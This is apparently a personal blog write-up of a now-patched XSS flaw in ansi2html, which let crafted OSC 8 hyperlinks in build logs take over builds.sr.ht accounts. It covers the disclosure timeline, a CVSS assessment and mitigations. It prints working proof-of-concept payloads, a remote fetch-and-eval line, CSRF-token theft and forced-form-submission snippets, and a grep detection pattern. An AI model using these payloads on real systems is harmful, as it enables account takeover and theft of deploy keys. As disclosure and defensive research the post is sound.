---
title: SourceHut account takeover via build logs (XSS in ansi2html.py) | CVE-2026-92973
date: 2026-09-23
description: A wormable vulnerability allowed anyone able to inject text in a build log on builds.sr.ht (or other instances) to take over accounts who viewed them
---

Welcome to my first big impact vulnerability writeup!

I like good stories, so let me describe some background first.
I recently had a 'great' idea (I know, I know, I should stop having these) to set up a sr.ht instance
that would *pay* people for hosting their projects.
You can find it shamelessly plugged in the timeline section,
in case you want to try it or flame me for it on socials.

Anyway, the story.
The first step was to clone some minimal subset of the sr.ht repos, and start hacking on it.

## No NLP

I tend to include the following statement in my vulnerability research submissions from this year.
Make from it what you wish.

*No NLP has been used in this research. The mistakes are all mine.*

## Structure

[SourceHut](https://sr.ht/~sircmpwn/sourcehut) is structured in several microservices,
the main ones being meta.sr.ht and probably git.sr.ht
or hub.sr.ht (the flagship instance hosts it at just sr.ht).
And of course builds.sr.ht, the CI.

One less known is mirror.sr.ht (slowly moving to mirror.srht.network),
containing prebuilt packages for various microservices.

I must say I like this approach, because it allows a very easy start on any machine
matching the flagship instance distro version exactly.

If your favourite project currently recommends installation via `curl|sudo bash`
or 'just launch Claude in this folder' (sic!),
please consider making yourself aware of the not less valid option
of distributing software to end users using actual software packages instead.[^1]

[^1]: Or at least provide some optional ultra-simple `configure` script
    that allows to just run `make install`/`ninja install`
    so that other people can package it easily.
    (By the way, I still can't get it why people use AppImage instead of just a static binary.)

## Building Alpine packages

So if you happen to use a different distro,
or even a different version of Alpine,
you are on your own a bit.
So there is the `sr.ht-apkbuilds` repo,
and you can 'fork' it to use your signing key,
your Alpine version and your mirror.
There is also `sr.ht-pkgbuilds` for Arch,
but it's effectively unmaintained at this point.[^2]

[^2]: You can still probably send your patches
    if you want to host your sr.ht on Arch!

This involves using builds.sr.ht to bootstrap the packages.
I tried to look at the page source of the build log,
because it kept scrolling not where I wanted,
which annoyed me a bit.

That's when I found this:

```css
/* ... */
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
.ansi38-150150150 { color: #969696; }
/* ... */
```

I decided to take a closer look how it's done,
and maybe fix it.
Look, I like SourceHut.
I can see there is quite some wasted compute and bandwidth here.
I want them to get rich so that others follow suit,
and there is some unnecessary waste slowing that.[^3]

[^3]: Hey Drew/Conrad/Simon/(sorry if I missed someone!),
    when you update ansi2html in sr.ht-apkbuilds,
    actually when you first restart builds.sr.ht after that,
    please measure the bandwidth impact on builds.sr.ht.
    I will make sure to link it here.

## ansi2html

I took a look into the logic converting [ANSI escape codes][w-ansi] to HTML,
and [I filed an issue for it][a2h-tru].
There has been no activity in the repo for over a year at that point,
so I decided to work on it, because I like receiving good patches myself,
when I am not focused on a particular project.
This quickly resulted in submitting [a PR fixing this particular issue][a2h-trupr].

[w-ansi]: https://en.wikipedia.org/wiki/ANSI_escape_code

Given my Capture The Flag background,
I started looking into ansi2html a bit more,
in hunt for more bugs (especially that I'm about to host it myself!).
Apart from parsing escape sequences for colors,
it also allows for automatic links, and [OSC 8 hyperlinks][w-osc].
[Because the code is not so well-structured yet][shotgun-parsing],
I was able to craft a malicious input string after reading
[this great XSS cheatsheet][cheatsheet] (now forever in my bookmarks):

```html
$ printf '\33]8;;https://example.com/"/autofocus/tabindex="1"/onfocus="alert`xss`\7Nothing to see here\33]8;;\7' | ansi2html
[...]
<a href="https://example.com/"/autofocus/tabindex="1"/onfocus="alert`xss`">Nothing to see here</a>
[...]
$ printf '\33]8;;javascript:alert`xss`\7Nothing to see here\33]8;;\7' | ansi2html
[...]
<a href="javascript:alert`xss`">Nothing to see here</a>
[...]
```

The former is worth some explanation.
No idea why, but as you can check, it parses to the same DOM tree as:

```html
<a
  href="https://example.com/"
  autofocus
  tabindex="1"
  onfocus="alert`xss`">
  Nothing to see here
</a>
```

So if you happen to be able to make `␛]8;;https://example.com/"/...␇` appear in the job logs
—[^4] which you can, either without even having an account,
by sending a patch to a public mailing list with continuous integration turned on,
or by controlling any remote resource that happens to be printed to the log — congratulations,
you have just created a build job at `https://builds.sr.ht/~someone-else/job/1234567`
that executes your payload in every browser that views it.
You can submit the job yourself, but this requires a paid account on the flagship instance.
And there are no anonymous payments currently there.

[^4]: Yes, that's an em dash. I use Polish typography here, because I have no editor to answer to.
  Feel free to correct me, though. You can be my drive-by editor.

[w-osc]: https://en.wikipedia.org/wiki/ANSI_escape_code#Operating_System_Command_sequences
[shotgun-parsing]: https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/
[cheatsheet]: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

## Weaponizing (do not try this at home)

The actual payload can be downloaded from an attacker's website,
like `eval(await (await fetch('https://example.com')).text())`
but here's some speculation about what it could do.

The build log page already contains the CSRF token.
You can read it with `document.querySelector('[name=_csrf_token]').value` for example,
or just use the existing form (part of the 'Resubmit build' button),
like ``document.querySelector('[name=manifest]').value=`something`;document.forms[0].submit()``.
Once you get an admin to view it, you can probably grant yourself admin rights.
The worse impact is that you have access to all the deploy keys,
and on builds.sr.ht, there are deploy keys for sr.ht itself
(probably not the case with other instances).

Making this part of the payload is left as an exercise for the curious reader.
I cannot stress this enough: remember to only test worms on your own infrastructure.
And never on production. Even if it's your production.

## How to do defense in depth here?

By restricting Content-Security-Policy.
I'm no expert here, but removing 'unsafe-inline' would be a good first step
(not useful advice in itself, because inline scripts are currently used
even on the build log page itself, for scrolling).

By extra sanitization (SourceHut added it, but it's overzealous - now there are no colors!).

And by restructuring the code in ansi2html into some stateful transducer automaton thing.

## Contact

I immediately emailed [~sircmpwn/sr.ht-security@lists.sr.ht](mailto:~sircmpwn/sr.ht-security@lists.sr.ht)
explaining the entire problem, complete with a fix that mitigated the worst part at least.

Drew (can I call you Drew? I guess we are all brothers in Source)
ended up patching builds.sr.ht to auto-sanitize the output from ansi2html instead.
Also a good choice.

## Upstream

Then I contacted upstream (maybe a bit too late? exact timeline below).
Ansi2html is one of the projects
[featured in the famous and by now beaten to death comic strip by Randall Munroe](https://is.gd/WVZvnI).[^5]
Placed under pycontribs org on GitHub, which ominously states:

> PyContribs main purpose is to assure that different Python-related projects remain maintained.

I reached out to the two top people from last 5 or so years' worth of contributor graph, emails from git history,
in order not to make the issue public yet, although it was already made public by the SourceHut announcement.

The maintainer I believed to be the 'main' one ([Sorin Sbarnea](https://github.com/ssbarnea))
has not replied to date (he might be having some kind of holiday),
although the other one ([Sebastian Pipping](https://github.com/hartwork)) has.
And the message was a cryptic, unusual for me to receive, 'mail me in two weeks'.

So I patiently waited two weeks, minding my another nascent business (let me try, okay?),
and sent the email.

[^5]: Oops, sorry, wrong link. I'm talking about https://xkcd.com/2347/ of course.

## Helping upstream

It turned out that Sebastian (can I call you Sebastian?)
is a cool guy and he figured he needed me to help him
because of something with ACLs on the repo.
We ended up getting ansi2html up from the suspension it was in, updating some obsolete scripts,
and releasing like 3 or 4 versions of ansi2html to PyPI together.

I tried to be helpful, but had some things going on with my PhD-in-spe,
so some latency crept in.

## Submitting for a CVE

Let's start with the hot take that CVSS scoring is a fallacy:
it should be separate for each product
and not just one for one root cause code path.

The purpose of CVSS is after all to provide useful information to downstream users
on whether to go patch it or not.
Researchers have the incentive to make it as high as possible.
And projects have the incentive to downplay it.
They do want to fix it, but they want to avoid the paperwork involved,
and the confidentiality dance of passing it all around (and I totally get it!).

The problem is, not all software is born equal, and [this is especially the case with libraries like libcurl][cvss-woes].

CVSS 4.0 is at least a bit better than CVSS 3.x.
It now makes a distinction on Vulnerable System and Subsequent System.
In case of XSS vulnerabilities the typical approach is to say that the web service is Vulnerable,
and the browser is Subsequent
(which kind of makes sense,
because the bug is in the service,
but then it impacts the victim browser first
in order to attack the web service itself again).

[The vector I initially came up with][cvss-calc] has been altered by VulnCheck.
Not sure why, but maybe it can be changed back? Or maybe not worth bothering.
Let me know what you think.
I also want to add this blog post to the CVE DB, but I might need to check how to do it.

<details>
<summary>Rationale behind this specific assessment</summary>

- AV:N - attack vector: network
- AC:L - attack complexity: low (no guesswork required, no need to bypass or synchronize attacks)
- AT:N - requirements: none (as opposed to specific config required)
- PR:N - privileges required: none (just send an email? it might also be low if there was no lists.sr.ht)
- UI:P - user interaction: passive (the victim must visit a site with JS on - the only problem, easy to solve)

vulnerable system (builds.sr.ht / all of sr.ht)

- VC:H - confidentiality impact: high (does cause a direct, serious loss of confidentiality - secrets get exposed)
- VI:H - integrity impact: high (can submit malicious build jobs as victim with access to deploy keys)
- VA:N - availability impact: none (cannot take down the whole service, unless clogging build workers counts)

subsequent system (victim browser)

- SC:L - confidentiality: low (limited access to tightly scoped secrets)
- SI:L - integrity: low (ability to forge tightly scoped requests)
- SA:N - availability: none (nothing more than from a direct visit)

supplemental

- AU:Y - automatable: yes (wormable - a victim can attack others right away, spreading the scope)
- R:I - recovery: irrecoverable (users cannot delete build jobs, only hide them)
- V:C - value density: concentrated (a single instance hosts many valuable projects with valuable deploy secrets)
- RE:L - response effort: low (basic mitigation: CSP header insertion at proxy level)
- U:Amber - urgency: amber (moderate urgency: poses direct danger to infra but has been sitting there for years)

</details>

While the exact impact can and should be disputed by actual users
(after all, SourceHut boasts working just fine *without* javascript),
I would argue for high or critical, not just a mere medium,
because if I were a blackhat,
it would suffice that Drew visited an affected build log with JS turned on,
and I could submit a build job in his name with access to SourceHut deploy keys.
Not sure how I would turn that into money or get away with it though.
Don't do this, kids. No excitement justifies it.

[cvss-woes]: https://daniel.haxx.se/blog/2025/01/23/cvss-is-dead-to-us/
[cvss-calc]: https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N/AU:Y/R:I/V:C/RE:L/U:Red

## Vulnerable versions

`ansi2html >=1.7.0, <1.9.4`, `builds.sr.ht >= 0.40.0, < 0.105.1`

## Indicators of compromise

Check your raw build logs for `␛]8;;https://example.com/"/...␇` or `␛]8;;javascript:...␇`.
In Bash, that would probably be something along `grep $'\33]8;[^\7\33]*"'` for the former.

## Full timeline (glad to have permanent records on everything!)

I'm not so proud of this timeline, but hey, at least everything is fixed now and there are no (?) records of people trying to use it.
I will include the official Arch Linux repo and the sr.ht Alpine Linux repo, because both systems were recommended at one point.

- 2019-03-11: [ansi2html gets added to builds.sr.ht](https://git.sr.ht/~sircmpwn/builds.sr.ht/commit/ad7fc189ccba57256552f2e021d765c57ce010b0)
  and [then to sr.ht-apkbuilds](https://git.sr.ht/~sircmpwn/sr.ht-apkbuilds/commit/a8017ef5fec8c3fe33f335fc86d157738ede85b3)
- 2021-09-03: [the bug gets introduced to upstream ansi2html](https://github.com/pycontribs/ansi2html/commit/d5d95551ba3623686ac9ce3b08cf493f6e0789db)
- 2022-02-08: [an affected version gets packaged for Alpine and goes live on the flagship instance](https://git.sr.ht/~sircmpwn/sr.ht-apkbuilds/commit/82f7e5353d40e92a057295af09b68fdba27eb1cc)
- 2022-07-10: [an affected version is packaged for Arch Linux](https://gitlab.archlinux.org/archlinux/packaging/packages/python-ansi2html/-/commit/e5c34c539e24ea62ab778a840789897751d65ac5)
- 2026-07-17: I maybe buy some domains[^6]
- 2026-07-31: I start working on SourceHut
- 2026-08-01: I submit [the issue][a2h-tru], and [the PR fixing the TrueColor bug][a2h-trupr] to ansi2html upstream.
  I prepare a preliminary patch for ansi2html and send it to [~sircmpwn/sr.ht-security@lists.sr.ht](mailto:~sircmpwn/sr.ht-security@lists.sr.ht).
- 2026-08-04: [the bug gets mitigated in builds.sr.ht code](https://git.sr.ht/~sircmpwn/builds.sr.ht/commit/d768f9edd4b527d3e184b138e1d53f2d3fab7677);
  I receive an email from Drew DeVault confirming the vulnerability.
  [Drew gives me a public shoutout](https://lists.sr.ht/~sircmpwn/sr.ht-admins/%3CDKFZYH5E7NRP.3S5TGB068189R@ddevault.org%3E) (thanks! I appreciate it!).
- 2026-08-06: bug reported upstream, ACKed immediately
- 2026-08-20: pinging upstream
- 2026-08-22: Sebastian replies, we set up when to work on it
- 2026-08-24: trying to oil ansi2html CI together before we can proceed to address the actual vulnerability
- 2026-08-29: version 1.9.3 published, not fixing the vulnerability
- 2026-08-31: I hint in a post that I am working on [a software forge that pays project owners](https://hub.copyleft.market)
- 2026-09-02: [PR with the final fix pushed](https://github.com/pycontribs/ansi2html/pull/263) and 1.9.4 published, fixing the vulnerability
- 2026-09-04: [Alpine Linux updates ansi2html to a fixed version](https://gitlab.alpinelinux.org/alpine/aports/-/commit/b176d1a582dd9343b1c848cf5bee68f52398f239)
- 2026-09-05: [Arch Linux updates ansi2html to a fixed version](https://gitlab.archlinux.org/archlinux/packaging/packages/python-ansi2html/-/commit/775cf971799e445bc07ae133b1e2b7d312ba71ed)
- 2026-09-xx: Life happens, I took a bit more work to sustain myself
- 2026-09-23: This blog post (actually -09-24 because it's past midnight by now. sigh.)
- 2077-??-??: Profit...?

Note how even carefully auditing ansi2html would not save SourceHut, unless redone on every bump.
builds.sr.ht remained vulnerable for (almost exactly) 4,5 years.

[^6]: Totally not an impulse buy. 'To get a sense of being invested.' I tell to myself.

[a2h-tru]: https://github.com/pycontribs/ansi2html/issues/259
[a2h-trupr]: https://github.com/pycontribs/ansi2html/pull/260

## Thanks

God for keeping the blackhat temptations away.  Danonek123 for keeping me company.  I love you.

## Summary

See, vulnerability research does not need to be a circus,
or security theatre, or a lawyered-up fight against bureaucracy.
But then you might not end up better off.

Excluding CTFs & invitations to minor conferences
(and being allowed to do some VR as part of my internship
back when at [Antmicro](https://antmicro.com),
which I am still grateful for),
I have made a metric 0.00€ (that's $0.00 Fahrenheit)
from my vulnerability research so far.
If you want to support me (so that I have more time for VR),
consider buying something.
I like it better than donations (though they are fine too!).
I'm also available for professional security consulting.

I'm not done! There's more coming, although arguably not so critical.
Subscribe to my RSS if you don't want to miss it.
